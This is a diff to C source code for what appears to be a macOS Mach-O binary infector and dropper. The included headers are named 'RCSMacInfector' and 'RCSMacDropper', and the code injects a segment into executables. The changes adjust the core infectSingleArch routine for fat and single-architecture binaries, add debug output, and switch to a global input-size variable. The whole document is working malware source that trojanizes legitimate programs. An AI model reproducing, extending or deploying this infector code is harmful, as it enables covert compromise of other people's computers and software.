@@ -46,8 +46,9 @@
 #include "RCSMacInfector.h"
 #include "RCSMacDropper.h"
 
-#define VERSION           0.9
+#define VERSION           0.9.2
 #define INJECTED_SEGMENT  "__INIT_STUBS"
+#define DEBUG
 
 //extern void dropperStart ();
 //extern void labelTest ();
@@ -141,7 +142,7 @@ int appendData (char *inputFilePointer,
                 unsigned int segmentVMAddr)
 {
   char *tempFilePointer   = NULL;
-  const char *_strings[]  = { "HOME", "%s/%s/%s/", "%s/%s", "/%s", "Library", "Preferences", "" };
+  const char *_strings[]  = { "HOME", "%s/%s/%s", "%s/%s", "/%s", "Library", "Preferences", "" };
   
   unsigned int originalEP = 0;
   int tempFileSize        = 0; 
@@ -195,7 +196,6 @@ int appendData (char *inputFilePointer,
       memset (&strings, 0, sizeof (stringTable));
 #ifdef WIN32
       strncpy_s(strings.value, sizeof(strings.value), _strings[z], _TRUNCATE);
-      printf("string[%d]= %s\n", z, strings.value);
 #else
       strncpy (strings.value, _strings[z], sizeof (strings.value));
 #endif
@@ -772,7 +772,16 @@ int infectSingleArch (char *inputFilePointer,
           }
         }
     }
-  
+
+#ifdef DEBUG
+  printf("[ii] inputFilePointer : 0x%08x\n", inputFilePointer);
+  printf("[ii] inputOffset      : 0x%08x\n", inputOffset);
+  printf("[ii] inputFileSize    : 0x%08x\n", inputFileSize);
+  printf("[ii] outputFilePointer: 0x%08x\n", outputFilePointer);
+  printf("[ii] outputOffset     : 0x%08x\n", outputOffset);
+  printf("[ii] outputFileSize   : 0x%08x\n", outputFileSize);
+  printf("[ii] offsetToArch     : 0x%08x\n", offsetToArch);
+#endif
   //
   // Now the rest of the file (data), here we wanna skip sizeof segment_command
   // in order to leave the file padded correctly for its TEXT segment
@@ -911,8 +920,7 @@ main (int argc, _mChar *argv[])
   struct fat_arch *f_arch;
   char *inputFilePointer      = NULL;
   char *outputFilePointer     = NULL;
-
-  int inputFileSize           = 0;
+  
   int outputFileSize          = 0;
   int fileType                = 0;
   int padding                 = 0;
@@ -996,13 +1004,13 @@ main (int argc, _mChar *argv[])
   // Map input file
 #ifdef WIN32
   if ((inputFilePointer = mapFile (inputFilePath,
-                                   &inputFileSize,
+                                   &gInputFileSize,
                                    &inputFD,
                                    &inputFDMap,
                                    0)) == NULL)
 
 #else
-  if ((inputFilePointer = mapFile (inputFilePath, &inputFileSize,
+  if ((inputFilePointer = mapFile (inputFilePath, &gInputFileSize,
                                    &inputFD, 0, 0)) == NULL)
 #endif
 	{
@@ -1035,7 +1043,7 @@ main (int argc, _mChar *argv[])
       outputFileSize = ((outputFileSize + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
     }
 
-  int tempSize = outputFileSize + inputFileSize;
+  int tempSize = outputFileSize + gInputFileSize;
   
 #ifdef DEBUG_VERBOSE
   printf ("padded outSize: %d\n", outputFileSize);
@@ -1044,7 +1052,7 @@ main (int argc, _mChar *argv[])
   printf ("[ii] gCoreFileSize: %d\n", gCoreFileSize);
   printf ("[ii] confCodeSize: %d\n", gConfFileSize);
   printf ("[ii] gKextFileSize: %d\n", gKextFileSize);
-  printf ("[ii] inputFileSize: %d\n", inputFileSize);
+  printf ("[ii] inputFileSize: %d\n", gInputFileSize);
   printf ("[ii] outputFileSize: %d\n", outputFileSize);
 #endif
   
@@ -1207,7 +1215,8 @@ main (int argc, _mChar *argv[])
     case kFatSwapBinary:
       {
         int x86Found      = 0;
-        
+        int otherFound    = 0;
+
         gFileType = 2;
         nfat = SWAP_LONG (gFatHeader.nfat_arch);
         int fArchSize = 0;
@@ -1242,11 +1251,22 @@ main (int argc, _mChar *argv[])
               {
                 x86Found++;
                 
-                offsetToResources = infectSingleArch ((char *)(inputFilePointer),
-                                                      (char *)(outputFilePointer),
-                                                      archOffset,
-                                                      fArchSize,
-                                                      outputFileSize);
+                if (otherFound == 1)
+                  {
+                    offsetToResources = infectSingleArch ((char *)(inputFilePointer),
+                                                          (char *)(outputFilePointer),
+                                                          archOffset,
+                                                          gInputFileSize,
+                                                          outputFileSize);
+                  }
+                else
+                  {
+                    offsetToResources = infectSingleArch ((char *)(inputFilePointer),
+                                                          (char *)(outputFilePointer),
+                                                          archOffset,
+                                                          fArchSize,
+                                                          outputFileSize);
+                  }
                 
                 printf("offsetToRes: %d\n", offsetToResources);
 
@@ -1269,7 +1289,11 @@ main (int argc, _mChar *argv[])
                     printf ("new Offset: 0x%x\n", archOffset);
 #endif
                   }
-                
+                else
+                  {
+                    otherFound++;
+                  }
+
                 u_int tempOfft = SWAP_LONG (f_arch->offset);
                 u_int tempSize = SWAP_LONG (f_arch->size);
                 
@@ -1296,10 +1320,10 @@ main (int argc, _mChar *argv[])
         printf ("[ii] Mach Binary found\n");
         
         if ((offsetToResources = infectSingleArch (inputFilePointer,
-                                                    outputFilePointer,
-                                                    0,
-                                                    inputFileSize,
-                                                    outputFileSize)) < 0)
+                                                   outputFilePointer,
+                                                   0,
+                                                   gInputFileSize,
+                                                   outputFileSize)) < 0)
           {
             printf("[ee] An error occurred while infecting the binary\n");
             
